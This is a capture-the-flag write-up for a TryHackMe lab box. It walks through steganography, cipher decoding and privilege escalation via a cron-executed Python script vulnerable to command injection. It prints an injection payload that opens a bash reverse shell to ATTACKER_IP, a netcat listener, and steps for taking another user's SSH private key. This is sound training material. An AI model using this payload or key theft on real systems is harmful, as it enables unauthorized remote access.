---
title: "THM: Break Out Of The Cage"
date: 2025-11-23 17:00:00 +1000
categories: [TryHackMe, Medium]
tags: [linux, steganography, audio-analysis, vigenere-cipher, command-injection, cron, audacity]
---

![Banner](/assets/Images/Break-Cage/banner.png)

Linux box with audio steganography hiding a Vigenère cipher key. Exploited command injection in a cron job to gain shell as secondary user, then decoded multi-layer encrypted credentials for root access.

## Initial Enumeration

### Nmap Scan
```
sudo nmap -sS -sV -T4 TARGET_IP -vvv
```

**Results:**
- HTTP service running
- FTP service running
- SSH available

---

## Web Enumeration

### Directory Discovery

Main page showed Nicolas Cage content with limited info.

Directory brute force revealed `/auditions/` endpoint containing `corrupt.mp3`.

---

## Audio Steganography

### Analyzing the MP3

Downloaded `corrupt.mp3` and opened in Audacity.

Switched to Spectrogram view (track dropdown menu).

**Discovery:** Hidden text visible in frequency domain - this is the Vigenère cipher key.

---

## FTP Anonymous Access
```
ftp TARGET_IP
Username: anonymous
Password: [blank]
```

Found file `dad_tasks`
```
get dad_tasks
```

**Contents:** Long encoded string

---

## Multi-Layer Decryption

### Decoding Process

1. Base64 decode first layer
2. Use spectrogram text as Vigenère key
3. Decrypt Vigenère cipher

**Result:** First flag revealed

---

## Initial SSH Access
```
ssh weston@TARGET_IP
```

Successfully logged in as weston.

### User Enumeration
```
cat /etc/passwd | grep /bin/bash | cut -d ':' -f 1
```

**Users discovered:**
- cage
- root
- weston

---

## Privilege Escalation Enumeration
```
sudo -l
```

**Finding:** User weston can execute `/usr/bin/bees` with sudo

### Binary Analysis
```
cat /usr/bin/bees
```

**Contents:**
```
#!/bin/bash
wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

File is write-protected and cannot be modified.

---

## Alternative Attack Vector

Noticed periodic broadcast messages - suggests automated execution.

### Finding Writable Scripts
```
find / -group cage 2>/dev/null
```

**Discovery:**
- `/opt/.dads_scripts/spread_the_quotes.py` - Executable by cage
- `/opt/.dads_scripts/.files/.quotes` - Writable by current user

---

## Vulnerable Script Analysis
```
cat /opt/.dads_scripts/spread_the_quotes.py
```

**Contents:**
```python
#!/usr/bin/env python
import os
import random
lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

**Vulnerability:** Direct string concatenation in `os.system()` without sanitization

---

## Command Injection Exploit

### Crafting the Payload
```
echo '$(bash -c "bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1")' > /opt/.dads_scripts/.files/.quotes
```

### Setting Up Listener
```
nc -nvlp 1234
```

Wait for cron job execution - shell received as cage user.

---

## Establishing Stable Shell

### SSH Key Access
```
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```

Copy private key to attack machine and set permissions:
```
chmod 600 cage_id_rsa
ssh -i cage_id_rsa cage@TARGET_IP
```

**Result:** Stable SSH session as cage

---

## Information Gathering as Cage
```
ls -la
cat Super_Duper_Checklist
```

Second flag obtained.
```
cat email_backup/email_2
cat email_backup/email_3
```

**Discovery:** References to "FACE" and potential password/key

---

## Root Access

### Cryptographic Solution

Used Vigenère cipher with key "FACE" to decrypt password from Sean's email.

**Result:** Root password revealed

### Final Escalation
```
su root
```

Enter decoded password.

**Result:** Root access achieved

---

## Flag Collection
```
cd /root
cat [email_file]
```

Third flag obtained.

---

## Notable Commands

| Command | Description |
|---------|-------------|
| `ftp anonymous@IP` | Anonymous FTP login |
| `strings file.mp3` | Extract strings from binary |
| `cat /etc/passwd \| grep /bin/bash` | List shell users |
| `find / -group name 2>/dev/null` | Find files by group ownership |
| `os.system("wall " + input)` | Python command injection vector |
| `echo 'payload' > file` | Inject malicious quote |
| `nc -nvlp PORT` | Netcat listener |

---

## Key Takeaways

- Audio steganography hides data in spectrograms - always check with Audacity
- Multi-layer encryption (Base64 + Vigenère) requires systematic decoding
- Python `os.system()` with unsanitized input enables command injection
- Cron jobs executing user-writable files create privesc opportunities
- SSH keys provide more stable shells than reverse connections
- Vigenère cipher with known key is trivially breakable

---

**Room:** CageMatch | **Platform:** TryHackMe | **Difficulty:** Medium | **Attack Path:** Audio Steganography → Command Injection → Vigenère Decryption
